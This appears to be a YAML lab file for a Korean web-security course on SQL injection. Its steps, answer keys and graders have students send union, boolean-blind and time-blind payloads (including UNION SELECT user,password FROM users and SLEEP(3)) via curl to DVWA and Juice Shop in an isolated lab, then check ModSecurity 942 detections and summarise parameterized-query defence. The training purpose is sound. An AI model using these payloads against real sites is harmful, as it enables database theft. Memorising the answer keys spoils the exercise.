lab_id: standalone-web-vuln-week05
title: "SQL Injection — Error/Union/Blind vs SQLi 탐지·방어"
version: standalone-web-vuln
course: web-vuln
week: 5
description: |
  SQLi 유형별 점검(WSTG-INPV-05) — Union/Boolean blind/Time blind/Error 페이로드와 ModSec 942 탐지,
  parameterized query 방어. dvwa/juice 대상. 공격은 el34-attacker. 인가된 실습만. 명령은 el34 호스트에서.
difficulty: hard
duration_minutes: 170
prerequisites:
  - "W01–W04 통과"
  - "el34 호스트 SSH + docker exec"
  - "lecture §2(유형별 페이로드) §3(탐지) §4(방어) 숙지"
objectives:
  - "Union/Boolean/Time blind SQLi 시도"
  - "유형별 ModSec 942 탐지 확인"
  - "parameterized query 방어"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 점검 — 대상
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
      ```
      ## ✅ 합격 기준
      대상 도달.
    hint: '도달성'
    category: survey
    points: 10
    answer: |
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
    answer_detail: "SQLi 점검 대상 = dvwa(차단)/juice(탐지만)."
    verify:
      type: output_contains
      expect: 'dvwa'
      field: stdout
      semantic:
        intent: "대상 점검"
        success_criteria: ["도달"]
        acceptable_methods: ["**[OSS] curl (권장)**"]
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 Union-based SQLi
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'union=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-\""
      ```
      ## ✅ 합격 기준
      Union SQLi 시도(403 탐지).
    hint: 'UNION SELECT'
    category: manipulation
    points: 12
    answer: |
      echo "=== Union-based SQLi ==="
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'union=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-\""
      echo "→ UNION SELECT로 결과에 직접 데이터 추출 시도. dvwa 403(942 탐지)"
    answer_detail: "Union-based = UNION SELECT로 다른 테이블 데이터를 결과에 직접. 가장 직접적. dvwa 403."
    verify:
      type: output_contains
      expect: 'union='
      field: stdout
      semantic:
        intent: "Union SQLi"
        success_criteria: ["UNION 시도"]
        acceptable_methods: ["**[OSS] UNION SELECT (권장)**"]
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 Boolean blind SQLi
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'true=%{http_code} ' -H 'Host: juice.el34.lab' \"http://10.20.30.1/?id=1%27%20AND%20%271%27=%271\""
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'false=%{http_code}\n' -H 'Host: juice.el34.lab' \"http://10.20.30.1/?id=1%27%20AND%20%271%27=%272\""
      ```
      ## ✅ 합격 기준
      Boolean blind(참/거짓) 페이로드를 시도한다.
    hint: "AND '1'='1 vs '1'='2"
    category: manipulation
    points: 12
    answer: |
      echo "=== Boolean blind SQLi ==="
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'true=%{http_code} ' -H 'Host: juice.el34.lab' \"http://10.20.30.1/?id=1%27%20AND%20%271%27=%271\""
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'false=%{http_code}\n' -H 'Host: juice.el34.lab' \"http://10.20.30.1/?id=1%27%20AND%20%271%27=%272\""
      echo "→ 참(1=1)/거짓(1=2) 응답 차이로 1비트씩 추론. 결과 노출 없어도 추출 가능"
    answer_detail: "Boolean blind = 참/거짓 응답 차이(길이/내용)로 데이터를 1비트씩 추론. 느리지만 결과 노출 없는 곳에도."
    verify:
      type: output_contains
      expect: 'true='
      field: stdout
      semantic:
        intent: "Boolean blind SQLi"
        success_criteria: ["참/거짓 시도"]
        acceptable_methods: ["**[OSS] AND 1=1/1=2 (권장)**"]
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 Time blind SQLi
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'time=%{http_code} t=%{time_total}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20AND%20SLEEP(3)--%20-\""
      ```
      ## ✅ 합격 기준
      Time blind(SLEEP) 페이로드를 시도한다.
    hint: 'AND SLEEP(3)'
    category: manipulation
    points: 12
    answer: |
      echo "=== Time blind SQLi ==="
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'time=%{http_code} 응답시간=%{time_total}s\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20AND%20SLEEP(3)--%20-\""
      echo "→ SLEEP으로 응답 지연 유발 → 시간차로 추론. WAF가 SLEEP 패턴 탐지(403)"
    answer_detail: "Time blind = SLEEP() 등으로 응답 지연 → 시간차로 참/거짓 추론. 응답 차이도 없을 때 최후 수단. WAF가 SLEEP 탐지."
    verify:
      type: output_contains
      expect: 'time='
      field: stdout
      semantic:
        intent: "Time blind SQLi"
        success_criteria: ["SLEEP 시도"]
        acceptable_methods: ["**[OSS] SLEEP (권장)**"]
    target_vm: web

  - order: 5
    instruction: |
      ## 🎯 탐지 — ModSec 942 (유형별)
      ## 💻 실행 명령
      ```bash
      docker exec el34-web sh -c 'sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "942[0-9]{3}" | sort | uniq -c'
      ```
      ## ✅ 합격 기준
      SQLi 유형들이 942에 탐지됨을 확인한다.
    hint: 'modsec 942 분포'
    category: analysis
    points: 12
    answer: |
      echo "=== SQLi 탐지 (ModSec 942 유형별) ==="
      docker exec el34-web sh -c 'sudo tail -200 /var/log/apache2/modsec_audit.log | grep -oE "942[0-9]{3}" | sort | uniq -c'
      echo "→ 942100(generic)/942160(blind)/942190(union)/942200... 유형별 룰. 모든 SQLi 변형 커버"
    answer_detail: "ModSec 942 룰군 = SQLi 유형별 탐지(942100 generic, 942160 blind, 942190 union 등). Union/Boolean/Time 모두 커버."
    verify:
      type: output_contains
      expect: '942'
      field: stdout
      semantic:
        intent: "SQLi 유형별 탐지"
        success_criteria: ["942 룰 분포"]
        acceptable_methods: ["**[OSS] modsec 942 (권장)**"]
    target_vm: web

  - order: 6
    instruction: |
      ## 🎯 차단 vs 탐지
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code} ' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
      ```
      ## ✅ 합격 기준
      dvwa(403) vs juice(200) 모드 차이를 확인한다.
    hint: 'dvwa 403 vs juice 200'
    category: analysis
    points: 12
    answer: |
      echo "=== 차단 vs 탐지 ==="
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code} ' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
      echo "→ dvwa=403(차단), juice=200(DetectionOnly). 같은 SQLi 다른 결과"
    answer_detail: "WAF 모드 차이 — dvwa 403 차단, juice 200 탐지만. 정책 선택."
    verify:
      type: output_contains
      expect: 'juice=200'
      field: stdout
      semantic:
        intent: "차단 vs 탐지"
        success_criteria: ["dvwa 403/juice 200"]
        acceptable_methods: ["**[OSS] dvwa vs juice (권장)**"]
    target_vm: web

  - order: 7
    instruction: |
      ## 🎯 방어 — parameterized query
      ## 💻 실행 명령
      ```bash
      echo "근본: parameterized query(prepared statement). 보조: 입력검증, 최소권한 DB, 에러숨김(Error-based 차단), WAF"
      ```
      ## ✅ 합격 기준
      SQLi 방어(parameterized query)를 정리한다.
    hint: 'parameterized query'
    category: report
    points: 10
    answer: |
      echo "=== SQLi 방어 ==="
      echo "① 근본: parameterized query/prepared statement — 입력을 코드 아닌 데이터로"
      echo "② 에러 숨김 → Error-based 차단, 최소권한 DB → 피해 축소"
      echo "③ 입력 검증(allowlist), WAF(보조)"
      echo "→ 유형 불문 근본 방어는 parameterized query"
    answer_detail: "SQLi 방어 = parameterized query(근본, 모든 유형 차단) + 에러 숨김 + 최소권한 + WAF."
    verify:
      type: output_contains
      expect: 'parameterized'
      field: stdout
      semantic:
        intent: "SQLi 방어"
        success_criteria: ["parameterized query"]
        acceptable_methods: ["**[설명] 방어 (권장)**"]
    target_vm: web

  - order: 8
    instruction: |
      ## 🎯 SQLi 점검 보고서
      ## 💻 보고서 양식
      ```markdown
      # 웹취약점 W05 SQLi 보고서 (학번, 이름)
      ## 1. 유형(Union/Boolean/Time)
      ## 2. 탐지(942 유형별)
      ## 3. 차단 vs 탐지
      ## 4. 방어(parameterized)
      ```
      ## ✅ 합격 기준
      보고서에 SQLi 유형 + 방어가 포함된다.
    hint: '유형+탐지+방어'
    category: report
    points: 10
    answer: |
      cat <<'EOF'
      # 웹취약점 W05 SQLi 보고서
      ## 1. 유형: Union(직접), Boolean blind(참/거짓), Time blind(SLEEP), Error
      ## 2. 탐지: ModSec 942 유형별 룰 → 949110 차단
      ## 3. 차단 vs 탐지: dvwa 403 / juice 200
      ## 4. 방어: parameterized query(근본), 에러숨김/최소권한/WAF
      ## 결론: SQLi는 유형별 추출 기법이 다르나 근본 방어는 동일(parameterized query)
      EOF
    answer_detail: "SQLi 점검 = 유형별 추출 + 942 탐지 + parameterized 방어. WSTG-INPV-05."
    verify:
      type: output_contains
      expect: 'SQLi'
      field: stdout
      semantic:
        intent: "SQLi 종합 보고"
        success_criteria: ["유형/탐지/방어"]
        acceptable_methods: ["**[관리적] SQLi 보고서 (권장)**"]
    target_vm: web
